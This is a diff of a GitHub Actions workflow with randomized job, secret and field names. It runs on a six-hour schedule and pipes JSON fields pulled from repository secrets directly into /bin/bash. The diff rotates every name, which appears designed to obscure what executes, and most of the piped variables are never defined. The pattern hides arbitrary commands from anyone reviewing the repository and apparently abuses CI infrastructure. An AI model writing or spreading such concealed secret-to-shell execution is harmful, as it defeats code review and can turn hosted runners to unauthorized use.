@@ -1,24 +1,23 @@
 name: liusichang3819
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '37 2/6 * * *'
+    - cron: '11 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: liusichang3819
         env:
-          shtg70: ${{ secrets.shtg70 }}
+          nwd239: ${{ secrets.nwd239 }}
         run: |
-          echo $shtg70 | jq -r .hcgrz5400 | /bin/bash
-          echo $elmsa54 | jq -r .hoz63 | /bin/bash
-          echo $od3921 | jq -r .h1 | /bin/bash
-          echo $i15550 | jq -r .rln448 | /bin/bash
-          echo $shv66 | jq -r .fjk97634 | /bin/bash
-          echo $s3 | jq -r .qi0540 | /bin/bash
-          echo $dtw385 | jq -r .jct95 | /bin/bash
+          echo $nwd239 | jq -r .fqffl80 | /bin/bash
+          echo $dmhc5969 | jq -r .t6309 | /bin/bash
+          echo $lwr8 | jq -r .bgfti71 | /bin/bash
+          echo $hh595 | jq -r .z9988 | /bin/bash
+          echo $bin10842 | jq -r .temum205 | /bin/bash
+          echo $dcxpv5649 | jq -r .e964 | /bin/bash
+          echo $z94374 | jq -r .a9 | /bin/bash
+          echo $rs50 | jq -r .mqb03 | /bin/bash
 
